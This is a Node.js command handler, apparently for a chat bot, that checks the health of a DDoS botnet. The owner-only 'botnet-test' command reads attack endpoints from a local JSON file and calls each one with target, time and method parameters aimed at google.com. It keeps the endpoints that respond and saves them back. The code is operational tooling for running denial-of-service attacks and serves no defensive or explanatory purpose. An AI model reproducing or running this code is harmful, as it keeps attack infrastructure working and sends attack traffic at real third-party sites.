const axios = require('axios');
const fs = require('fs');

const handler = async (m) => {
    m.reply(`Wait A Seconds...`)
    const botnetData = loadBotnetData();
    let successCount = 0;
    const timeout = 20000;
    const validEndpoints = [];

    const requests = botnetData.endpoints.map(async (endpoint) => {
        const apiUrl = `${endpoint}?target=https://google.com&time=1&methods=ninja`;

        try {
            const response = await axios.get(apiUrl, { timeout });
            if (response.status === 200) {
                successCount++;
                validEndpoints.push(endpoint);
            }
        } catch (error) {
            console.error(`Error sending request to ${endpoint}: ${error.message}`);
        }
    });

    await Promise.all(requests);

    botnetData.endpoints = validEndpoints;
    saveBotnetData(botnetData);

    m.reply(`Checked endpoints. ${successCount} botnet endpoint(s) are online.`);
};

function loadBotnetData() {
    try {
        return JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
    } catch (error) {
        console.error('Error loading botnet data:', error.message);
        return { endpoints: [] };
    }
}

function saveBotnetData(botnetData) {
    try {
        fs.writeFileSync('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
    } catch (error) {
        console.error('Error saving botnet data:', error.message);
    }
}

handler.command = ['botnet-test'];
handler.rowner = true;
module.exports = handler;
